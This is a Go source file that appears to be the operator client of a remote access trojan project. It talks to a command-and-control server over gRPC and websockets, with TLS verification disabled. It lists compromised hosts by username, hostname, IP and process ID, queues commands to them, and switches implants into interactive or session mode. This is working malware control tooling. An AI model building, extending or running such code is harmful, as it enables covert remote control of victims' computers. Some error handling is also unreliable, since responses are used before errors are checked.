package main

import (
	"fmt"
	//"os"
	"github.com/gorilla/websocket"
	"sync"
	"net/url"
	"encoding/json"
	"time"
	"crypto/tls"
	//"strings"
	"context"
	"google.golang.org/grpc"
	pb "rat/modules/pb" // adjust path to your generated pb files
	
)


// map to hold websocket connections
var ActiveConnections = make(map[string]*websocket.Conn)

var (
    connMu   sync.Mutex
    OperatorConn     *websocket.Conn
    respChan = make(chan string)
)


type Client struct {
	conn       *grpc.ClientConn
	grpcClient pb.MyServiceClient
}


type ServerResponse struct {
    Status string `json:"status"`
}


type commandData struct {
	Action      string `json:"action"`
    GUID        string `json:"guid"`
    CommandCode string `json:"command_code"`
    Param       string `json:"param"`
    CommandID   string `json:"command_id"`
    Executed    string `json:"executed"`
    TaskedAt    string `json:"tasked_at"`
}


// go routine to handle retreving command output and printing
func ListenForOutput(id string, conn *websocket.Conn) {
	defer func() {
		conn.Close()
		delete(ActiveConnections, id)
		fmt.Println("[+] Disconnected");
	}()

	for {
		messageType, message, err := conn.ReadMessage()
		if err != nil {
			if string(message) == "" {
				break;
			}
			fmt.Println("[!] Failed Reading Message");
			break;
		}

		switch messageType {
		case websocket.TextMessage:
			if string(message) == "ping" {
				conn.WriteMessage(websocket.TextMessage, []byte("pong"))
				continue;
			}
			fmt.Printf("%s", string(message));
			fmt.Println("-----------------------------------------");
			prompt := fmt.Sprintf("%s[%s %s]%s ", grey, time.Now().Format("01/02"), time.Now().Format("15:04:05"), reset)
			fmt.Printf("%s $>", prompt)

		}
	}


}

func connectToServer() (*Client, bool){
	
	conn, err := grpc.Dial("localhost:50051", grpc.WithInsecure())
	if err != nil {
	    fmt.Println("[!] Failed Connecting, check if c2 is running!");
	    return nil, false
	}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
    defer cancel()

    client := pb.NewMyServiceClient(conn)
    response, err := client.HealthCheck(ctx, &pb.EmptyRequest{})
	if err != nil {
	    conn.Close()
	    fmt.Printf("[!] Server not responding: %v\n", err)
	    return nil, false
	}

	// Only check response.Status AFTER confirming err == nil
	if response.Status != "success" {
	    fmt.Println("[!] Server returned non-success status")
	    conn.Close()
	    return nil, false
	}
	// Create client
	
	fmt.Println("[+] Connected to Server!");
	return &Client{
		conn:       conn,
		grpcClient: client,
	}, true

}

func connectToWebSocket(id string) {
	conn, exists := ActiveConnections[id]
	if exists {
	    fmt.Println("[!] Already Connected")
	    return
	}

	dialer := websocket.Dialer{
        TLSClientConfig: &tls.Config{
            InsecureSkipVerify: true,
        },
    }

	// Construct URL
	// TODO: create config file to handle domains/ips
	u := url.URL{
		Scheme: "ws",
		Host: "127.0.0.1:443",
		Path: "/ws/" + id,
	}


	conn, _, err := dialer.Dial(u.String(), nil)
	if err != nil {
		fmt.Println("[!] Failed To Connect, Server not running");
		return;
	}

	ActiveConnections[id] = conn;
	fmt.Println("[+] Connected To Server");

	go ListenForOutput(id, conn);
}



func (c *Client) ListClients() {
	UsersReponse, err := c.grpcClient.ListClientsRPC(context.Background(), &pb.CommandReqData{Action: "ListClients",})

	if err != nil {
		fmt.Println(err)
	}

	for _, user := range UsersReponse.User {
		fmt.Printf("Code Name: %s | Username: %s | Hostname:%s | Version: %s | IP: %s | PID: %s | Last Seen %s\n", user.CodeName, user.Username, user.Hostname, user.Version, user.Ip, user.Pid, user.LastCheckin)
		fmt.Printf("------------------------------------------------------------------------------------------------------\n")
	}
	return
	// cmd := commandData {
	// 	Action: "ListClients",
	// }

	// jsonBytes, err := json.Marshal(cmd)
	// if err != nil {
	// 	fmt.Println("[!] Failed Converting to json")
	// 	return
	// }
	// connMu.Lock()
	// err = OperatorConn.WriteMessage(websocket.TextMessage, jsonBytes)
	// connMu.Unlock()


	// select {
    // case respStr, ok := <-respChan:
    //     if !ok {
    //         return 
    //     }
    //     var UserData UserData
    //      _ = json.Unmarshal([]byte(respStr), &UserData)
        
    //     for _, user := range UserData.Users {
    //     	fmt.Printf("Name: %s || username: %s || hostname: %s || Version: %s || Ip: %s || Pid: %s || Last Seen: %s ||\n", user.CodeName, user.Username, user.Hostname, user.Version, user.Ip, user.Pid, formatLastSeen(user.LastCheckin))
    //     }
       	
    //     return
    // case <-time.After(30 * time.Second):
    //     return 

     
    // }
}




func (c *Client) sendCommand(action string, guid string, command_code int32, param string, param2 string, command_id string, tasked_at string, interactive bool) error{

	resp, err := c.grpcClient.InsertCommand(context.Background(), &pb.CommandReqData{
																	Action: action,
																	Guid: guid,
																	CommandCode: command_code,
																	Param: param,
																	Param2: param2,
																	CommandId: command_id,
																	TaskedAt: tasked_at})

	if resp.Status == "success" {
		fmt.Println("[+] Command Inserted!");
		return nil
	} else {
		fmt.Println(err)
	}

	// cmd := commandData {
	// 	Action: action,
	// 	GUID: guid,
	// 	CommandCode: command_code,
	// 	Param:  param,
	// 	CommandID: command_id,
	// 	Executed: "0",
	// 	TaskedAt: tasked_at,
	// }

	// jsonBytes, err := json.Marshal(cmd)
	// if err != nil {
	// 	fmt.Println("[!] Failed Converting to json")
	// 	return ServerResponse{}, fmt.Errorf("dadasd");
	// }
	// connMu.Lock()
	// err = OperatorConn.WriteMessage(websocket.TextMessage, jsonBytes)
	// connMu.Unlock()

	// if interactive == true {return ServerResponse{}, nil}

	// if err != nil {
	//     fmt.Println("Error sending message:", err)
	// }
	// select {
    // case respStr, ok := <-respChan:
    //     if !ok {
    //         return ServerResponse{}, fmt.Errorf("connection closed")
    //     }
    //     var resp ServerResponse
    //     err := json.Unmarshal([]byte(respStr), &resp)
    //     if err != nil {
    //         return ServerResponse{}, fmt.Errorf("invalid json response: %v", err)
    //     }
    //     return resp, nil
    // case <-time.After(10 * time.Second):
    //     return ServerResponse{}, fmt.Errorf("timeout waiting for response")
    // }

    return nil

}


func (c *Client) TurnRatInteracive(clientId string)  bool{
	// cmd := commandData {
	// 	Action: "interactive",
	// 	GUID: clientId,
	// 	Param: "0 0",
	// 	CommandCode: m["reconfig"],
	// 	CommandID: generateRandomID(8),
	// 	Executed: "0",
	// }

	// jsonBytes, _ := json.Marshal(cmd);

	// connMu.Lock()
	// _ = OperatorConn.WriteMessage(websocket.TextMessage, jsonBytes)
	// connMu.Unlock()

	resp, err := c.grpcClient.InsertCommand(context.Background(), &pb.CommandReqData{Action: "interactive", 
																					Guid: clientId, 
																					Param: "0 0", 
																					CommandCode: m["reconfig"],
																					CommandId: generateRandomID(8),
																					Executed:0})
	if resp.Status == "success" && err == nil {
		return true
	} else {
		return false
	}


}

func TurnRatSession(clienID string) {
	cmd := commandData {
		Action: "addCmd",
		GUID: clienID,
		Param: "10 5",
		CommandCode: "session",
	}
	jsonBytes, _ := json.Marshal(cmd)
	connMu.Lock()
	_ = OperatorConn.WriteMessage(websocket.TextMessage, jsonBytes);
	connMu.Unlock()
}



type ConvertResponse struct {
	ClientId string `json:"clientID"`
}

func (c *Client) code_name_to_guid(CodeName string) (string, error){
	resp, err := c.grpcClient.ResolveID(context.Background(), &pb.CommandReqData{Action: "convert", Param:CodeName})
	if err != nil {
		fmt.Println(err)
		return "", err
	}

	if resp.UserId == "" {
		fmt.Println("[!] Client Doesnt Exist")
		return "", fmt.Errorf("Client Not Found")
	}
	fmt.Println(resp.UserId)
	
    
    return resp.UserId, nil
   
}